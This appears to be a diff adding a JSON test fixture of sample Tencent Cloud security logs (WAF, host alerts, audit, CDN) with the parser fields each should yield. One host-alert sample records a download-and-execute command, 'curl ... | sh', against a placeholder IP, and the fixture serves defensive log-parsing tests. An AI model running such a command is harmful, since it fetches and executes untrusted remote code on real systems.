@@ -1,0 +1,108 @@
+{
+  "version": 1,
+  "note": "腾讯云模板正样本与关键字段断言。line 为按腾讯云公开日志/API 字段结构重建的真实感样本（未联网抓取，取值与 IP 为 RFC 5737/私网示例段）。",
+  "samples": {
+    "tencent-waf-attack-json": {
+      "protocol": "webhook",
+      "fixture": "parsers/tencent-waf-attack-1.log",
+      "line": "{\"time\":\"2026-02-21T10:37:00+08:00\",\"domain\":\"www.example.com\",\"src_ip\":\"203.0.113.95\",\"method\":\"POST\",\"url\":\"/api/upload\",\"attack_type\":\"webshell\",\"action\":\"block\",\"rule_id\":\"waf-tc-8801\",\"rule_name\":\"WebShell上传\",\"user_agent\":\"curl/8.5.0\",\"http_version\":\"1.1\",\"status\":403}",
+      "expect": {
+        "event.time": "2026-02-21T02:37:00.000Z",
+        "url.domain": "www.example.com",
+        "source.ip": "203.0.113.95",
+        "http.request.method": "POST",
+        "url.path": "/api/upload",
+        "rule.id": "waf-tc-8801",
+        "rule.name": "WebShell上传",
+        "user_agent.original": "curl/8.5.0",
+        "http.version": "1.1",
+        "http.response.status_code": "403",
+        "event.severity": "medium",
+        "event.category": "web",
+        "event.action": "denied"
+      }
+    },
+    "tencent-cwp-alert-json": {
+      "protocol": "webhook",
+      "line": "{\"event_time\":\"2026-02-21 10:30:00\",\"event_type\":\"进程异常\",\"hostname\":\"vm-app-01\",\"quuid\":\"9f2c1d4b-6a8e-0f3c-5d7b-9a1e2f4c6d8b\",\"src_ip\":\"203.0.113.93\",\"user_name\":\"root\",\"process_name\":\"bash\",\"cmd_line\":\"curl -s http://198.51.100.9/x.sh | sh\",\"level\":\"high\",\"status\":\"unhandled\",\"description\":\"检测到可疑下载执行行为\"}",
+      "expect": {
+        "event.time": "2026-02-21T10:30:00.000Z",
+        "host.name": "vm-app-01",
+        "host.id": "9f2c1d4b-6a8e-0f3c-5d7b-9a1e2f4c6d8b",
+        "source.ip": "203.0.113.93",
+        "user.name": "root",
+        "process.name": "bash",
+        "process.command_line": "curl -s http://198.51.100.9/x.sh | sh",
+        "event.action_raw": "unhandled",
+        "message": "检测到可疑下载执行行为",
+        "event.severity": "high",
+        "event.category": "process"
+      }
+    },
+    "tencent-cwp-virus-json": {
+      "protocol": "webhook",
+      "line": "{\"event_time\":\"2026-02-21 10:35:00\",\"hostname\":\"vm-app-01\",\"file_name\":\"x.sh\",\"file_path\":\"/tmp/x.sh\",\"md5\":\"9f2c1d4b6a8e0f3c5d7b9a1e2f4c6d8b\",\"virus_name\":\"Linux.Trojan.Mirai\",\"level\":\"critical\",\"status\":\"isolated\",\"description\":\"检测到木马文件并已隔离\"}",
+      "expect": {
+        "host.name": "vm-app-01",
+        "file.name": "x.sh",
+        "file.path": "/tmp/x.sh",
+        "file.hash.md5": "9f2c1d4b6a8e0f3c5d7b9a1e2f4c6d8b",
+        "threat.software.name": "Linux.Trojan.Mirai",
+        "message": "检测到木马文件并已隔离",
+        "event.severity": "critical",
+        "event.action_raw": "isolated",
+        "event.category": "malware"
+      }
+    },
+    "tencent-cls-log-json": {
+      "protocol": "object-storage",
+      "line": "{\"__CONTENT__\":\"Failed password for root from 203.0.113.92 port 55012 ssh2\",\"__FILENAME__\":\"/var/log/secure\",\"__HOSTNAME__\":\"vm-app-01\",\"__PKG_ID__\":\"pkg-0001\",\"__ROBOT_NAME__\":\"robot-0001\",\"__SOURCE__\":\"10.20.30.44\",\"__TIME__\":1771663200,\"__TOPIC__\":\"topic-secure\"}",
+      "expect": {
+        "event.time": "2026-02-21T08:40:00.000Z",
+        "message": "Failed password for root from 203.0.113.92 port 55012 ssh2",
+        "host.name": "vm-app-01",
+        "log.file.path": "/var/log/secure",
+        "event.id": "pkg-0001",
+        "event.dataset": "topic-secure",
+        "source.ip": "10.20.30.44",
+        "event.severity": "info"
+      },
+      "category_after_normalize": "authentication"
+    },
+    "tencent-cloudaudit-json": {
+      "protocol": "object-storage",
+      "line": "{\"eventTime\":\"2026-02-21T10:38:00Z\",\"eventName\":\"DeleteInstances\",\"eventSource\":\"cvm.tencentcloudapi.com\",\"eventRegion\":\"ap-guangzhou\",\"userIdentity\":{\"principalId\":\"100000000001\",\"type\":\"CAMUser\",\"accountId\":\"100000000001\"},\"sourceIPAddress\":\"203.0.113.96\",\"requestID\":\"9f2c1d4b-6a8e-0f3c-5d7b-9a1e2f4c6d8b\",\"resourceName\":\"ins-0001\",\"errorCode\":\"\"}",
+      "expect": {
+        "event.time": "2026-02-21T10:38:00.000Z",
+        "event.action_raw": "DeleteInstances",
+        "event.provider": "cvm.tencentcloudapi.com",
+        "cloud.region": "ap-guangzhou",
+        "cloud.account.id": "100000000001",
+        "user.id": "100000000001",
+        "user.type": "CAMUser",
+        "source.ip": "203.0.113.96",
+        "event.reference": "9f2c1d4b-6a8e-0f3c-5d7b-9a1e2f4c6d8b",
+        "cloud.resource_name": "ins-0001",
+        "event.category": "cloud-control",
+        "event.severity": "info"
+      }
+    },
+    "tencent-cdn-access-log": {
+      "protocol": "file",
+      "line": "203.0.113.94 - - [21/Feb/2026:10:36:02 +0800] \"GET /videos/demo.mp4 HTTP/1.1\" 206 1048576 \"https://www.example.com/\" \"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)\" \"static.example.com\"",
+      "expect": {
+        "source.ip": "203.0.113.94",
+        "event.time": "2026-02-21T02:36:02.000Z",
+        "http.request.method": "GET",
+        "url.path": "/videos/demo.mp4",
+        "http.response.status_code": "206",
+        "http.response.body.bytes": "1048576",
+        "http.request.referrer": "https://www.example.com/",
+        "user_agent.original": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)",
+        "url.domain": "static.example.com",
+        "event.severity": "info",
+        "event.category": "web"
+      }
+    }
+  }
+}
